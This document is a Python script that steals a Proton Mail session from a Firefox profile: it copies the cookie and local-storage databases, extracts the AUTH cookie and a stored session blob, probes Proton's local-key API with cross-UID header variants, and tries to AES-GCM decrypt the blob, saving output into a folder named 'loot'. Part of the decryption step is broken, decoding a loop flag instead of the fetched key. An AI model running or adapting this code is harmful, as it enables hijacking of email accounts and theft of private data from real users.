#!/usr/bin/env python3
"""keypassword-try.py — get ClientKey for the current mail session via full-scope auth, decrypt ps blob."""
import json, os, base64, sqlite3, shutil, tempfile, urllib.request, urllib.error

LIVE = r'C:\Users\morpher\AppData\Roaming\Mozilla\Firefox\Profiles\3xzkegqp.default-release'
SRC_UID = 'llk24t5bc4kcfgzrtyhii54q3gh4w7bg'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/157.0'

# 1. current value of the full-scope session
t = os.path.join(tempfile.gettempdir(), 'kp.sqlite')
shutil.copy(os.path.join(LIVE, 'cookies.sqlite'), t)
shutil.copy(os.path.join(LIVE, 'cookies.sqlite-wal'), t + '-wal')
c = sqlite3.connect(t)
val = c.execute('SELECT value FROM moz_cookies WHERE name = ?', ('AUTH-' + SRC_UID,)).fetchone()[0]

# 2. current mail ps blob from live mail ls
lt = os.path.join(tempfile.gettempdir(), 'kpls.sqlite')
shutil.copy(os.path.join(LIVE, r'storage\default\https+++mail.proton.me\ls\data.sqlite'), lt)
for e in ('-wal', '-shm'):
    s = os.path.join(LIVE, r'storage\default\https+++mail.proton.me\ls\data.sqlite') + e
    if os.path.exists(s):
        shutil.copy(s, lt + e)
c2 = sqlite3.connect(lt)
ps = None
for key, v in c2.execute("SELECT key, value FROM data WHERE key LIKE 'ps-%' ORDER BY key DESC LIMIT 1"):
    ps = json.loads(v.decode('utf-8'))
print('ps key: UID=%s payloadType=%s version=%s' % (ps.get('UID', '')[:12], ps.get('payloadType'), ps.get('payloadVersion')))
blob = ps['blob']

# 3. getLocalKey — try auth variants: bearer + cookie, cross-UID and own-UID
def get_local_key(host, target_uid, use_bearer, use_cookie, src_uid=SRC_UID):
    r = urllib.request.Request(host + '/api/auth/v4/sessions/local/key')
    hdrs = []
    if use_cookie:
        hdrs.append('AUTH-%s=%s' % (src_uid, val))
    if use_bearer:
        r.add_header('Authorization', 'Bearer ' + val)
    if hdrs:
        r.add_header('Cookie', '; '.join(hdrs))
    r.add_header('x-pm-uid', target_uid)
    r.add_header('x-pm-appversion', 'web-mail@5.0.135.9')
    r.add_header('Accept', 'application/json')
    r.add_header('User-Agent', UA)
    try:
        with urllib.request.urlopen(r, timeout=25) as resp:
            return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')[:200]

for host in ('https://mail-api.proton.me', 'https://account.proton.me'):
    for tgt, b, ck in ((ps['UID'], True, False), (ps['UID'], True, True), (SRC_UID, True, True), (ps['UID'], False, True)):
        st, body = get_local_key(host, tgt, b, ck)
        print('%s tgt=%s bearer=%s cookie=%s -> %d %s' % (host.split('//')[1][:8], tgt[:8], b, ck, st, body[:100]))
        if st == 200:
            open(os.path.join(tempfile.gettempdir(), 'clientkey.txt'), 'w').write(body)
            raise SystemExit(0)

# 4. decrypt blob: AES-GCM, payloadVersion 1 => 16-byte IV prefix, no AAD
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
raw = base64.b64decode(ck)
key16 = raw[:16]
iv, ct = raw if False else (None, None)
data = base64.b64decode(blob)
iv, tag_and_ct = data[:16], data[16:]
aes = AESGCM(key16)
try:
    plain = aes.decrypt(iv, tag_and_ct, None)
    print('DECRYPTED:', plain.decode('utf-8', 'replace')[:300])
    open(r'C:\Users\morpher\Downloads\a\session\loot\C10\ps-blob-plain.json', 'wb').write(plain)
except Exception as e:
    # maybe key is full 32 bytes or iv 12
    for klen, ivlen in ((32, 12), (32, 16), (16, 12)):
        try:
            k = raw[:klen]
            iv2, ct2 = data[:ivlen], data[ivlen:]
            plain = AESGCM(k).decrypt(iv2, ct2, None)
            print('DECRYPTED (klen=%d iv=%d):' % (klen, ivlen), plain.decode('utf-8', 'replace')[:300])
            open(r'C:\Users\morpher\Downloads\a\session\loot\C10\ps-blob-plain.json', 'wb').write(plain)
            break
        except Exception:
            continue
    else:
        print('decrypt failed:', repr(e)[:120])